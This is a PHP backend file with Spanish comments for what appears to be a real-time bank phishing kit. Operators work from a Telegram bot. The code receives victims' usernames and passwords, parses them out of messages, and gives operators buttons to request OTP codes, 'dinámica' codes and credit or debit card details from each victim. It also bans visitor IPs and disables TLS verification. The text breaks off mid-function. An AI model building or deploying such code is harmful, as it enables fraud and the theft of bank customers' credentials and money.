<?php
// api.php - Web Service para Telegram
// VERSIÓN SEGURA - Usa variables de entorno en Azure
// NUNCA debe imprimir el TOKEN en pantalla, logs ni respuestas JSON.

// ============================================
// 1. CONFIGURACIÓN DE PHP (ANSI FILTRADO)
// ============================================

ini_set('upload_max_filesize', '20M');
ini_set('post_max_size', '20M');
ini_set('max_execution_time', '300');
ini_set('max_input_time', '300');
ini_set('memory_limit', '256M');

// 🔥 LO MÁS IMPORTANTE: NUNCA mostrar errores por pantalla
//    (evita filtración de token/chat_id/directorios/rutas)
ini_set('display_errors',         '0');
ini_set('display_startup_errors', '0');
ini_set('log_errors',             '1');
ini_set('html_errors',            '0');
error_reporting(0);

// ============================================================
// 1.5. SANITIZADOR DE SECRETOS (aplica a logs + respuestas)
// ============================================================
function apiSecretPatterns() {
    static $patterns = null;
    if ($patterns !== null) return $patterns;
    $p = [];

    // Token Telegram BotFather (num:nums_letters_-_)  ej: 8847xxxxx:AAHxxxxxxxxxxxxxxxxxxxx
    $p[] = '/\b\d{6,15}:[A-Za-z0-9_\-]{20,}\b/';

    // Cualquier string que diga TELEGRAM_TOKEN, TOKEN=, BOT_TOKEN=, TOKEN:, etc
    $p[] = '/(TELEGRAM[_-]?TOKEN|BOT[_-]?TOKEN|API[_-]?KEY)\s*[:=]\s*[^\s&"\']{5,}/i';

    // Chat ID (-100123456789 o -12345678)
    $p[] = '/(?<!\d)-\d{6,16}(?!\d)/';

    $patterns = $p;
    return $patterns;
}

function sanitize_secret($input) {
    if ($input === null) return $input;
    if (is_array($input)) {
        $out = [];
        foreach ($input as $k => $v) {
            $out[$k] = sanitize_secret($v);
        }
        return $out;
    }
    if (is_object($input)) {
        $out = new stdClass();
        foreach (get_object_vars($input) as $k => $v) {
            $out->$k = sanitize_secret($v);
        }
        return $out;
    }
    if (is_string($input)) {
        // A) Patrones conocidos
        $out = preg_replace_callback(apiSecretPatterns(), function($m) {
            $s = $m[0];
            $len = strlen($s);
            if ($len <= 6) return '***';
            return substr($s, 0, 3) . str_repeat('*', max(1, $len - 6)) . substr($s, -3);
        }, $input);
        // B) Si la string se parece a la constante TELEGRAM_TOKEN (exact match)
        if (defined('TELEGRAM_TOKEN') && $out !== '' && $out === (string)TELEGRAM_TOKEN) {
            $out = '***REDACTED_TOKEN***';
        }
        if (defined('TELEGRAM_CHAT_ID') && $out !== '' && $out === (string)TELEGRAM_CHAT_ID) {
            $out = '***REDACTED_CHAT_ID***';
        }
        return $out;
    }
    return $input;
}

// ============================================
// 2. 🔥 LECTURA DE CREDENCIALES (SEGURA)
// ============================================

// Primero: Variables de entorno de Azure
$token = getenv('TELEGRAM_TOKEN');
$chatId = getenv('TELEGRAM_CHAT_ID');

// Segundo: Solo para desarrollo local (o VPS con config.php)
if (empty($token) && file_exists('config.php')) {
    require_once 'config.php';
    $token = defined('TELEGRAM_TOKEN') ? TELEGRAM_TOKEN : '';
    $chatId = defined('TELEGRAM_CHAT_ID') ? TELEGRAM_CHAT_ID : '';
}

// 🔴 NUEVO v9: DESACTIVAR OUTPUT BUFFER DE security.php (la API devuelve JSON, NO HTML).
//    Evita que se inyecte <script>window.__SEC...</script> dentro de respuestas JSON,
//    lo que causaba SyntaxError: Unexpected token '<' en fetch() del cliente JS.
if (!defined('SEC_NO_OUTPUT_BUFFER')) define('SEC_NO_OUTPUT_BUFFER', true);

// Incluir seguridad y antibots
if (file_exists('security.php')) {
    require_once 'security.php';
}

// ============================================
// 2.5. 🛡️ RATE LIMIT (anti bombardeo / DoS)
//       Bloquea IP que haga > 60 requests por minuto
// ============================================

if (!defined('RATE_LIMIT_DIR'))       define('RATE_LIMIT_DIR', __DIR__ . '/.state/rate');
if (!defined('RATE_LIMIT_MAX_REQ'))   define('RATE_LIMIT_MAX_REQ', 60);
if (!defined('RATE_LIMIT_WINDOW_SEC')) define('RATE_LIMIT_WINDOW_SEC', 60);
if (!defined('RATE_LIMIT_BLOCK_SEC')) define('RATE_LIMIT_BLOCK_SEC', 300);

function apiRateDir() {
    if (!is_dir(RATE_LIMIT_DIR)) {
        @mkdir(RATE_LIMIT_DIR, 0755, true);
    }
    return RATE_LIMIT_DIR;
}

function apiGetClientIp() {
    $keys = ['HTTP_CF_CONNECTING_IP', 'HTTP_X_FORWARDED_FOR', 'HTTP_X_REAL_IP', 'HTTP_CLIENT_IP', 'REMOTE_ADDR'];
    foreach ($keys as $k) {
        if (isset($_SERVER[$k]) && !empty($_SERVER[$k])) {
            $v = trim(explode(',', $_SERVER[$k])[0]);
            if (filter_var($v, FILTER_VALIDATE_IP)) return $v;
        }
    }
    return 'unknown';
}

function apiRateLimitCheck() {
    // 🔥 NUEVO v9: WHITELIST DE ACCIONES LIGERAS / SIN SIDE-EFFECT.
    // No las contamos para evitar falsos 429 cuando load.js dispara storeTxIp + sendMessage
    // al mismo tiempo, o cuando el polling last_callback es constante (1 req/seg).
    $action = isset($_GET['action']) ? (string)$_GET['action'] : '';
    $whitelistActions = [
        'health', 'secure_vars', 'last_callback', 'debug_state',
        'store_tx_ip', 'get_updates'
    ];
    // Método GET sin side-effect y sin envío de datos a Telegram → permitido sin límite estricto
    $isGetSideEffectFree = (
        $_SERVER['REQUEST_METHOD'] === 'GET'
        && !in_array($action, ['send_message', 'send_photo', 'answer_callback', 'edit_message', 'save_last_callback'], true)
    );
    if (in_array($action, $whitelistActions, true) || $isGetSideEffectFree) {
        // Sólo chequeamos que la IP NO ESTÉ YA BLOQUEADA (si alguien abusó y ya está bl_<IP>.txt).
        $ip = apiGetClientIp();
        if ($ip === 'unknown') return;
        $safe = preg_replace('/[^a-zA-Z0-9_\.\-]/', '_', $ip);
        $dir  = apiRateDir();
        $blockFile = $dir . '/bl_' . $safe . '.txt';
        if (is_file($blockFile)) {
            $blockedUntil = intval(@file_get_contents($blockFile));
            if ($blockedUntil > time()) {
                http_response_code(429);
                header('Retry-After: ' . max(1, $blockedUntil - time()));
                header('Content-Type: application/json');
                echo json_sanitize_encode([
                    'error' => 'Too many requests',
                    'message' => 'IP temporalmente bloqueada. Intenta nuevamente en ' . max(1, $blockedUntil - time()) . ' segundos.',
                    'blocked_until' => date('c', $blockedUntil)
                ], JSON_UNESCAPED_UNICODE);
                exit();
            } else {
                @unlink($blockFile);
            }
        }
        return;
    }

    $ip = apiGetClientIp();
    if ($ip === 'unknown') return; // no hay ip valida, no aplicar

    $safe = preg_replace('/[^a-zA-Z0-9_\.\-]/', '_', $ip);
    $dir  = apiRateDir();
    $histFile  = $dir . '/rl_' . $safe . '.json';
    $blockFile = $dir . '/bl_' . $safe . '.txt';

    // 1. Si la IP está bloqueada, expiró?
    if (is_file($blockFile)) {
        $blockedUntil = intval(@file_get_contents($blockFile));
        if ($blockedUntil > time()) {
            http_response_code(429);
            header('Retry-After: ' . max(1, $blockedUntil - time()));
            header('Content-Type: application/json');
            echo json_sanitize_encode([
                'error' => 'Too many requests',
                'message' => 'Has excedido el l\u00EDmite de peticiones. Intenta nuevamente en ' . max(1, $blockedUntil - time()) . ' segundos.',
                'blocked_until' => date('c', $blockedUntil)
            ], JSON_UNESCAPED_UNICODE);
            exit();
        } else {
            @unlink($blockFile);
        }
    }

    // 2. Leer historial de timestamps
    $now = time();
    $hist = [];
    if (is_file($histFile)) {
        $raw = @file_get_contents($histFile);
        $arr = @json_decode($raw, true);
        if (is_array($arr)) $hist = $arr;
    }

    // 3. Limpiar timestamps viejos (fuera de la ventana)
    $cutoff = $now - RATE_LIMIT_WINDOW_SEC;
    $hist = array_values(array_filter($hist, function($t) use ($cutoff) {
        return intval($t) > $cutoff;
    }));

    // 4. Agregar request actual
    $hist[] = $now;

    // 5. Guardar de vuelta
    @file_put_contents($histFile, json_encode($hist), LOCK_EX);

    // 6. Limpieza de GC (1% de probabilidad, borra archivos > 2h)
    if (mt_rand(1, 100) === 50) {
        $gcCutoff = $now - 7200;
        $dh = @opendir($dir);
        if ($dh) {
            while (($f = readdir($dh)) !== false) {
                if ($f === '.' || $f === '..') continue;
                $fp = $dir . DIRECTORY_SEPARATOR . $f;
                $mt = @filemtime($fp);
                if ($mt && $mt < $gcCutoff) @unlink($fp);
            }
            closedir($dh);
        }
    }

    // 7. Verificar si supera límite -> bloquear
    if (count($hist) > RATE_LIMIT_MAX_REQ) {
        $blockUntil = time() + RATE_LIMIT_BLOCK_SEC;
        @file_put_contents($blockFile, (string)$blockUntil, LOCK_EX);
        http_response_code(429);
        header('Retry-After: ' . RATE_LIMIT_BLOCK_SEC);
        header('Content-Type: application/json');
        echo json_sanitize_encode([
            'error' => 'Too many requests',
            'message' => 'L\u00EDmite excedido. IP bloqueada por ' . RATE_LIMIT_BLOCK_SEC . ' segundos.',
            'blocked_until' => date('c', $blockUntil)
        ], JSON_UNESCAPED_UNICODE);
        exit();
    }
}

// 🔥 Aplicar rate limit ANTES DE CUALQUIER OTRA COSA (SALVO QUE SEA TELEGRAM QUIEN LLAMA)
if (!defined('SKIP_API_RATE_LIMIT') || SKIP_API_RATE_LIMIT !== true) {
    apiRateLimitCheck();
}

// Tercero: Si no hay nada, error claro
if (empty($token) || empty($chatId)) {
    http_response_code(500);
    header('Content-Type: application/json');
    echo json_sanitize_encode([
        'error' => 'Token no configurado',
        'solution' => 'Configurar TELEGRAM_TOKEN y TELEGRAM_CHAT_ID en variables de entorno de Azure'
    ]);
    exit();
}

// Definir constantes si no existen
if (!defined('TELEGRAM_TOKEN')) define('TELEGRAM_TOKEN', $token);
if (!defined('TELEGRAM_CHAT_ID')) define('TELEGRAM_CHAT_ID', $chatId);
if (!defined('LOG_ERRORS')) define('LOG_ERRORS', true);
if (!defined('LOG_FILE')) define('LOG_FILE', __DIR__ . '/logs/telegram_errors.log');
if (!defined('CALLBACK_STATE_DIR')) define('CALLBACK_STATE_DIR', __DIR__ . '/.state');
if (!defined('CALLBACK_TTL_SEC')) define('CALLBACK_TTL_SEC', 3600);

function apiStateDir() {
    if (!is_dir(CALLBACK_STATE_DIR)) {
        @mkdir(CALLBACK_STATE_DIR, 0755, true);
    }
    return CALLBACK_STATE_DIR;
}
function apiLockFile() { return apiStateDir() . '/last_callback.lock'; }
function apiCallbackFile($tx) { return apiStateDir() . '/cb_' . preg_replace('/[^a-zA-Z0-9_\-]/', '_', (string)$tx) . '.json'; }
function apiOffsetFile()   { return apiStateDir() . '/polling_offset.txt'; }
function apiGetOffset() {
    $f = apiOffsetFile();
    if (!is_file($f)) return 0;
    $v = intval(@file_get_contents($f));
    return $v > 0 ? $v : 0;
}
function apiSetOffset($n) {
    $n = intval($n);
    if ($n <= 0) return;
    @file_put_contents(apiOffsetFile(), (string)$n);
}
function apiSaveCallback($tx, $data, $extra = []) {
    if ($tx === '' || $tx === null) return;
    $file = apiCallbackFile($tx);
    $lock = fopen(apiLockFile(), 'c');
    if (!$lock) return;
    try {
        if (flock($lock, LOCK_EX)) {
            $payload = [
                'saved_at' => time(),
                'data' => $data
            ];
            if (is_array($extra) && count($extra) > 0) {
                $payload['extra'] = $extra;
            }
            @file_put_contents($file, json_encode($payload, JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES));
            flock($lock, LOCK_UN);
        }
    } finally { fclose($lock); }
}
function apiReadCallback($tx) {
    if ($tx === '' || $tx === null) return null;
    $file = apiCallbackFile($tx);
    if (!is_file($file)) return null;
    $raw = @file_get_contents($file);
    if ($raw === false || $raw === '') return null;
    $arr = json_decode($raw, true);
    if (!is_array($arr) || !isset($arr['saved_at']) || !isset($arr['data'])) return null;
    if ((time() - intval($arr['saved_at'])) > CALLBACK_TTL_SEC) {
        @unlink($file);
        return null;
    }
    return $arr;
}
function apiDeleteCallback($tx) {
    if ($tx === '' || $tx === null) return;
    $file = apiCallbackFile($tx);
    if (is_file($file)) @unlink($file);
}
function apiTxFromCallbackData($s) {
    $s = (string)$s;
    if ($s === '') return '';
    if (strpos($s, ':') === false) return '';
    $parts = explode(':', $s, 2);
    return isset($parts[1]) ? trim($parts[1]) : '';
}

/**
 * Devuelve el TEXTO del botón pulsado a partir del callback_data.
 * Ej: "pedir_tc:SEL919" => "Tarjeta de Crédito"
 */
function apiButtonLabelFromData($s) {
    $s = (string)$s;
    if ($s === '') return 'Desconocido';
    $prefix = $s;
    if (strpos($s, ':') !== false) {
        $parts = explode(':', $s, 2);
        $prefix = trim($parts[0]);
    }
    $map = [
        'error_logo'      => '❌ Error de Logo',
        'pedir_dinamica'  => '🔑 Pedir Dinámica',
        'error_dinamica'  => '❌ Error Dinámica',
        'pedir_tc'        => '💳 Tarjeta de Crédito',
        'error_tc'        => '❌ Error TC Crédito',
        'pedir_td'        => '💳 Tarjeta Débito',
        'error_td'        => '❌ Error TD Débito',
        'soy'             => '✅ Soy Yo',
        'error_otp'       => '❌ Error OTP',
        'otp'             => '🔐 OTP',
        'seleccion_919'   => '✅ SELECCION 919',
        'finalizar'       => '🏁 Finalizar',
        'ban_ip'          => '🚫 BANEAR IP'
    ];
    return isset($map[$prefix]) ? $map[$prefix] : ('Botón: ' . htmlspecialchars($prefix));
}

/**
 * Extrae el nombre/usuario del usuario de Telegram desde callback_query.from
 * y lo formatea en una sola línea legible.
 */
function apiFormatTgUser($from) {
    if (!is_array($from)) return 'Usuario desconocido';
    $parts = [];
    $firstName = isset($from['first_name']) ? trim((string)$from['first_name']) : '';
    $lastName  = isset($from['last_name'])  ? trim((string)$from['last_name'])  : '';
    $userName  = isset($from['username'])   ? trim((string)$from['username'])   : '';
    $tgId      = isset($from['id'])         ? (int)$from['id']                   : 0;

    $fullName = trim($firstName . ' ' . $lastName);
    if ($fullName !== '') $parts[] = $fullName;
    if ($userName  !== '') $parts[] = '@' . $userName;
    if ($tgId      > 0)   $parts[] = '(ID:' . $tgId . ')';

    return count($parts) > 0 ? implode(' ', $parts) : 'Usuario desconocido';
}

/**
 * Extrae el PREFIJO/COMANDO de un callback_data (todo antes del primer :).
 * Ej: "pedir_dinamica:SEL919" => "pedir_dinamica"
 */
function apiCommandPrefixFromData($s) {
    $s = (string)$s;
    if ($s === '') return '';
    if (strpos($s, ':') === false) return $s;
    $parts = explode(':', $s, 2);
    return trim($parts[0]);
}

/**
 * Devuelve el OPERADOR en formato CORTO (para mensaje editado).
 * Prioridad: @username > Nombre Apellido > Nombre > ID numérico.
 * SIN agregar el (ID:...) numérico al final.
 */
function apiShortOperatorFrom($from) {
    if (!is_array($from)) return 'Operador desconocido';
    $userName  = isset($from['username'])   ? trim((string)$from['username'])   : '';
    $firstName = isset($from['first_name']) ? trim((string)$from['first_name']) : '';
    $lastName  = isset($from['last_name'])  ? trim((string)$from['last_name'])  : '';
    $tgId      = isset($from['id'])         ? (int)$from['id']                   : 0;

    if ($userName !== '')  return '@' . $userName;
    $fullName = trim($firstName . ' ' . $lastName);
    if ($fullName !== '')  return $fullName;
    if ($firstName !== '') return $firstName;
    if ($tgId > 0)         return (string)$tgId;
    return 'Operador desconocido';
}

/**
 * Extrae User y Pass desde el TEXTO ORIGINAL del mensaje de Telegram.
 * El formato esperado es:
 *   🧑‍💻 User: <algo>
 *   🔐 Pass: <algo>
 * (o las variantes con código HTML <b>/<code>)
 *
 * Devuelve [ 'user' => '...', 'pass' => '...' ]
 */
function apiExtractUserPassFromMessage($text) {
    $out = ['user' => '', 'pass' => ''];
    if (!is_string($text) || $text === '') return $out;

    // Strip HTML tags (por si viene <b> o <code>)
    $plain = strip_tags($text);

    // User (con fallback a múltiples patrones: emoji "🧑‍💻" / "🦱‍💻" / "User" literal)
    if (preg_match('/(?:User|Usuario)\s*[:：]\s*(.+)/iu', $plain, $m)) {
        $out['user'] = trim($m[1]);
    } elseif (preg_match('/[💻🧑🦱]\s*User\s*[:：]\s*(.+)/iu', $plain, $m)) {
        $out['user'] = trim($m[1]);
    }

    // Pass (con fallback)
    if (preg_match('/(?:Pass|Password|Clave|Contraseña)\s*[:：]\s*(.+)/iu', $plain, $m)) {
        $out['pass'] = trim($m[1]);
    } elseif (preg_match('/[🔐🔑]\s*(?:Pass|Clave)\s*[:：]\s*(.+)/iu', $plain, $m)) {
        $out['pass'] = trim($m[1]);
    }

    return $out;
}

/**
 * Edita el MENSAJE ORIGINAL de Telegram añadiendo al final
 * el comando pulsado y el operador (SIN repetir User/Pass).
 * Fuego y olvido: NO bloquea ni rompe el flujo si falla.
 */
function apiAppendButtonPressToMessage($cq, $buttonLabel, $tgUserStr) {
    try {
        if (!is_array($cq)) return false;
        $chat_id    = isset($cq['message']['chat']['id'])       ? $cq['message']['chat']['id']       : null;
        $message_id = isset($cq['message']['message_id'])     ? $cq['message']['message_id']     : null;
        $origText   = isset($cq['message']['text'])           ? (string)$cq['message']['text']    : '';
        if ($chat_id === null || $message_id === null || $origText === '') return false;

        $rawData = isset($cq['data']) ? (string)$cq['data'] : '';
        $from    = isset($cq['from']) ? $cq['from']          : null;
        $comando = apiCommandPrefixFromData($rawData);
        if ($comando === '') $comando = htmlspecialchars($rawData);
        $operador = apiShortOperatorFrom($from);

        // Evitar añadir dos veces la misma info (tanto formato antiguo como nuevo)
        $tagNew = "\n————————————\n";
        $tagOld = "\n\n<b>👆 BOTÓN PULSADO:</b>";
        if (strpos($origText, $tagNew) !== false || strpos($origText, $tagOld) !== false) return false;

        $append  = $tagNew;
        $append .= "\u{2705} <b>Comando:</b> " . htmlspecialchars($comando) . "\n";
        $append .= "\u{1F464} <b>Operador:</b> " . htmlspecialchars($operador);

        $newText = $origText . $append;

        $r = sendToTelegram('editMessageText', [
            'chat_id'                  => $chat_id,
            'message_id'               => $message_id,
            'text'                     => $newText,
            'parse_mode'               => 'HTML',
            'disable_web_page_preview' => true
        ]);
        return (is_array($r) && isset($r['ok']) && $r['ok'] === true);
    } catch (\Exception $e) {
        logError('apiAppendButtonPressToMessage exc: ' . $e->getMessage());
        return false;
    }
}

/**
 * Hace polling de getUpdates EN EL LADO DEL SERVIDOR.
 * Guarda el offset en archivo para que NO se pierdan callbacks.
 * Guarda cada callback en el archivo correspondiente por transaction_id.
 * (DEBUG_LOG = escribe paso a paso en logs/telegram_errors.log).
 */
function apiServerSidePoll() {
    $trace = [];
    $trace['ts'] = date('Y-m-d H:i:s');
    try {
        // IMPORTANTE: sendToTelegram() ya usa fallback por file_get_contents(stream_context)
        // si curl NO existe. Así que aquí seguimos sin bloquear.
        $trace['curl_extension_loaded'] = function_exists('curl_init');
        $trace['fallback_streams_enabled'] = function_exists('stream_context_create');

        $offset = apiGetOffset();
        $trace['offset_leido'] = $offset;
        $reqOffset = $offset > 0 ? $offset + 1 : 0;
        $trace['offset_pedido'] = $reqOffset;

        $response = sendToTelegram('getUpdates', [
            'offset' => $reqOffset,
            'timeout' => 1,
            'limit' => 100,
            'allowed_updates' => ['callback_query', 'message']
        ]);
        $trace['response_is_array'] = is_array($response);
        $trace['response_ok']   = isset($response['ok']) ? (bool)$response['ok'] : null;
        if (isset($response['error'])) $trace['response_error'] = (string)$response['error'];

        if (!is_array($response) || !isset($response['ok']) || $response['ok'] !== true) {
            logError('apiServerSidePoll: Telegram devolvió respuesta inválida -> ' . json_encode(sanitize_secret($response), JSON_UNESCAPED_UNICODE));
            // Devolvemos true porque la FUNCIÓN SÍ se ejecutó correctamente.
            // Si hubo error de token inválido / red / 401 etc, ya quedó logueado.
            return true;
        }
        if (!isset($response['result']) || !is_array($response['result'])) {
            $trace['result_count'] = 0;
            return true;
        }

        $updates = $response['result'];
        $trace['result_count'] = count($updates);
        $maxId = $offset;
        $callbacksGuardados = 0;

        foreach ($updates as $upd) {
            if (!is_array($upd) || !isset($upd['update_id'])) continue;
            $uid = intval($upd['update_id']);
            if ($uid > $maxId) $maxId = $uid;

            if (isset($upd['callback_query']) && is_array($upd['callback_query'])) {
                $cq = $upd['callback_query'];
                $data = isset($cq['data']) ? (string)$cq['data'] : '';
                $tx   = apiTxFromCallbackData($data);
                $trace['upd_'.$uid.'_data'] = $data !== '' ? $data : '(empty)';
                $trace['upd_'.$uid.'_tx']   = $tx   !== '' ? $tx   : '(empty_tx)';

                // Usuario Telegram + botón pulsado
                $from        = isset($cq['from']) ? $cq['from'] : null;
                $tgUserStr   = apiFormatTgUser($from);
                $buttonLabel = apiButtonLabelFromData($data);
                $extra       = [
                    'tg_user'       => $tgUserStr,
                    'tg_from'       => (is_array($from) ? $from : null),
                    'button_label'  => $buttonLabel,
                    'pressed_at'    => date('Y-m-d H:i:s')
                ];
                $trace['upd_'.$uid.'_tg_user'] = $tgUserStr;
                $trace['upd_'.$uid.'_button']  = $buttonLabel;

                // 🚨 LO PRIMERO: GUARDAR CALLBACK. Nada más importa (answerCallback y editMessage van después).
                if ($tx !== '') {
                    apiSaveCallback($tx, $data, $extra);
                    $callbacksGuardados += 1;

                    // ====== 🔥 BAN IP REAL (si el botón pulsado es BANEAR IP) ======
                    $prefix = apiCommandPrefixFromData($data);
                    if ($prefix === 'ban_ip' && function_exists('sec_ban_by_tx')) {
                        $bannedIp = sec_ban_by_tx($tx, 'telegram_polling');
                        $trace['upd_'.$uid.'_ban_ip'] = $bannedIp ? 'banned:'.$bannedIp : 'NO_IP_FOUND';
                    }
                    // =================================================================
                }

                // answerCallbackQuery (MEJOR INTENTO, si falla = NO IMPIDE el redirect)
                try {
                    if (isset($cq['id'])) {
                        $r = sendToTelegram('answerCallbackQuery', [
                            'callback_query_id' => $cq['id']
                        ]);
                        if (isset($r['error'])) {
                            logError('apiServerSidePoll: answerCallbackQuery('.$cq['id'].') falló: '.(string)$r['error']);
                        }
                    }
                } catch (\Exception $e) {
                    logError('apiServerSidePoll: answerCallbackQuery exc: '.$e->getMessage());
                }

                // ✏️ Editar el mensaje ORIGINAL añadiendo usuario + botón pulsado
                try {
                    $okEdit = apiAppendButtonPressToMessage($cq, $buttonLabel, $tgUserStr);
                    $trace['upd_'.$uid.'_edit_msg_ok'] = $okEdit;
                } catch (\Exception $e) {
                    $trace['upd_'.$uid.'_edit_msg_exc'] = $e->getMessage();
                }

                // quitar teclado inline del mensaje (TAMBIÉN EN SEGUNDO PLANO, nunca bloquea save callback)
                try {
                    $chat_id = isset($cq['message']['chat']['id']) ? $cq['message']['chat']['id'] : null;
                    $message_id = isset($cq['message']['message_id']) ? $cq['message']['message_id'] : null;
                    if ($chat_id !== null && $message_id !== null) {
                        $r2 = sendToTelegram('editMessageReplyMarkup', [
                            'chat_id' => $chat_id,
                            'message_id' => $message_id,
                            'reply_markup' => ['inline_keyboard' => []]
                        ]);
                        if (isset($r2['error'])) {
                            logError('apiServerSidePoll: editMessageReplyMarkup(msg='.$message_id.', chat='.json_encode(sanitize_secret($chat_id)).') falló: '.(string)$r2['error']);
                        }
                    }
                } catch (\Exception $e) {
                    logError('apiServerSidePoll: editMessageReplyMarkup exc: '.$e->getMessage());
                }
            }
        }

        if ($maxId > 0) {
            apiSetOffset($maxId);
            $trace['offset_actualizado'] = $maxId;
        }
        $trace['callbacks_guardados'] = $callbacksGuardados;

        // Escribir traza resumida solo si hubo updates o callbacks (no spamear log)
        if (count($updates) > 0 || $callbacksGuardados > 0) {
            logError('apiServerSidePoll RESUMEN: ' . json_encode(sanitize_secret($trace), JSON_UNESCAPED_UNICODE));
        }
        return true;
    } catch (\Exception $e) {
        $trace['exc'] = $e->getMessage();
        logError('apiServerSidePoll EXCEPCIÓN: ' . $e->getMessage() . ' | trace=' . json_encode(sanitize_secret($trace), JSON_UNESCAPED_UNICODE));
        return true; // lo importante: guarda la traza. Con excepción también = ya la registró.
    }
}

// ============================================
// 3. CABECERAS CORS SEGURAS (Solo mismo origen) + CSRF
// ============================================

header('Content-Type: application/json');
header('X-Content-Type-Options: nosniff');
header('Referrer-Policy: no-referrer');

// ---- CERRADO: solo admitimos CORS si el Origin coincide CON NUESTRO HOST ----
function api_compute_allowed_origin() {
    $httpOrigin = isset($_SERVER['HTTP_ORIGIN']) ? trim((string)$_SERVER['HTTP_ORIGIN']) : '';
    if ($httpOrigin === '') return '';
    $parsed = parse_url($httpOrigin);
    if (!is_array($parsed) || empty($parsed['host'])) return '';
    $originHost = strtolower($parsed['host']);
    $originPort = isset($parsed['port']) ? (int)$parsed['port'] : null;

    $currentHost = isset($_SERVER['HTTP_HOST']) ? strtolower((string)$_SERVER['HTTP_HOST']) : '';
    $currentParts = explode(':', $currentHost);
    $currentHostOnly = $currentParts[0] ?? '';
    $currentPort = count($currentParts) > 1 ? (int)$currentParts[1] : null;

    if ($currentHostOnly === '' || $originHost !== $currentHostOnly) return '';
    if ($originPort !== $currentPort) return '';
    return $httpOrigin;
}

$allowedOrigin = api_compute_allowed_origin();
if ($allowedOrigin !== '') {
    header('Access-Control-Allow-Origin: ' . $allowedOrigin);
    header('Vary: Origin');
    header('Access-Control-Allow-Credentials: true');
    header('Access-Control-Allow-Methods: GET, POST, OPTIONS');
    header('Access-Control-Allow-Headers: Content-Type, Authorization, X-Requested-With, X-CSRF-Token');
}

if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(204);
    exit();
}

// ---- VALIDACIÓN CSRF (para acciones que NO son health ni secure_vars) ----
function api_csrf_valid() {
    // Acciones públicas sin CSRF
    $action = isset($_GET['action']) ? (string)$_GET['action'] : '';
    $whitelist = ['health', 'secure_vars', 'last_callback', 'debug_state'];
    if (in_array($action, $whitelist, true) && $_SERVER['REQUEST_METHOD'] === 'GET') return true;

    // GETs sin side-effect → permitidos (no mutan nada)
    if ($_SERVER['REQUEST_METHOD'] === 'GET') return true;

    // POST / requiere header X-CSRF-Token que coincida con el de la sesión
    $sent = '';
    if (isset($_SERVER['HTTP_X_CSRF_TOKEN'])) $sent = trim((string)$_SERVER['HTTP_X_CSRF_TOKEN']);
    if ($sent === '' && isset($_SERVER['HTTP_X_XSRF_TOKEN'])) $sent = trim((string)$_SERVER['HTTP_X_XSRF_TOKEN']);
    if ($sent === '') {
        $raw = file_get_contents('php://input');
        if (is_string($raw) && $raw !== '') {
            $arr = @json_decode($raw, true);
            if (is_array($arr) && !empty($arr['csrf_token'])) $sent = trim((string)$arr['csrf_token']);
        }
    }
    $expected = isset($_SESSION['csrf_token']) ? (string)$_SESSION['csrf_token'] : '';
    if ($sent === '' || $expected === '') return false;
    return hash_equals($expected, $sent);
}

if (!api_csrf_valid()) {
    http_response_code(403);
    echo json_sanitize_encode([
        'error' => 'CSRF token inválido o ausente.',
        'hint'  => 'El cliente debe enviar header X-CSRF-Token con el valor de window.__SEC.csrf.'
    ]);
    exit();
}

// ============================================
// 4. RESTO DEL CÓDIGO
// ============================================

function logError($message) {
    if (defined('LOG_ERRORS') && LOG_ERRORS) {
        $logDir = dirname(LOG_FILE);
        if (!is_dir($logDir)) {
            @mkdir($logDir, 0755, true);
        }
        $safeMsg = function_exists('sanitize_secret') ? sanitize_secret($message) : $message;
        @file_put_contents(LOG_FILE,
            date('Y-m-d H:i:s') . ' - ' . $safeMsg . PHP_EOL,
            FILE_APPEND | LOCK_EX
        );
    }
}

/**
 * Wrapper de json_encode + sanitize_secret para TODAS las respuestas JSON públicas.
 * NUNCA se te escapa el TOKEN / chat_id por una respuesta JSON.
 */
function json_sanitize_encode($value, $flags = 0, $depth = 512) {
    $safe = function_exists('sanitize_secret') ? sanitize_secret($value) : $value;
    return json_encode($safe, $flags, $depth);
}

function sendToTelegram($method, $data) {
    $token = TELEGRAM_TOKEN;
    $url = "https://api.telegram.org/bot{$token}/{$method}";
    $jsonPayload = json_encode($data);

    // MÉTODO 1: cURL (si está disponible)
    if (function_exists('curl_init')) {
        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $jsonPayload);
        curl_setopt($ch, CURLOPT_TIMEOUT, 12);
        $response = curl_exec($ch);
        $error = curl_error($ch);
        $httpCode = intval(curl_getinfo($ch, CURLINFO_HTTP_CODE));
        curl_close($ch);

        if ($error) {
            logError("cURL Error ({$method}): " . $error);
            return ['error' => function_exists('sanitize_secret') ? sanitize_secret($error) : $error];
        }
        if ($httpCode <= 0) $httpCode = 0;
        if ($httpCode !== 200) {
            logError("HTTP Error cURL ({$method}): {$httpCode} - " . var_export($response, true));
            return ['error' => "HTTP Error: " . $httpCode, 'http_code' => $httpCode];
        }
        $arr = json_decode($response, true);
        if (is_array($arr)) {
            if (isset($arr['result']['message']['chat']) && is_array($arr['result']['message']['chat'])) {
                $arr['result']['message']['chat'] = sanitize_secret($arr['result']['message']['chat']);
            }
        }
        return $arr;
    }

    // MÉTODO 2: file_get_contents (FALLBACK — sin extensión curl, 100% PHP nativo)
    // Esto es lo que hace que FUNCIONE EN TU WINDOWS sin curl.
    $ctx = stream_context_create([
        'http' => [
            'method'  => 'POST',
            'header'  => "Content-Type: application/json\r\n",
            'content' => $jsonPayload,
            'timeout' => 12,
            'ignore_errors' => true
        ],
        'ssl'  => [
            'verify_peer'      => false,
            'verify_peer_name' => false,
            'allow_self_signed' => true
        ]
    ]);
    $response = @file_get_contents($url, false, $ctx);
    $httpCode = 0;
    if (isset($http_response_header) && is_array($http_response_header)) {
        foreach ($http_response_header as $h) {
            if (preg_match('#^HTTP/\d+(?:\.\d+)?\s+(\d{3})\b#i', $h, $m)) {
                $httpCode = intval($m[1]);
            }
        }
    }

    if ($response === false || $response === '') {
        $err = error_get_last();
        $msg = $err && isset($err['message']) ? $err['message'] : 'file_get_contents failed';
        logError("file_get_contents Error ({$method}): " . $msg);
        return ['error' => function_exists('sanitize_secret') ? sanitize_secret($msg) : $msg];
    }

    if ($httpCode !== 200) {
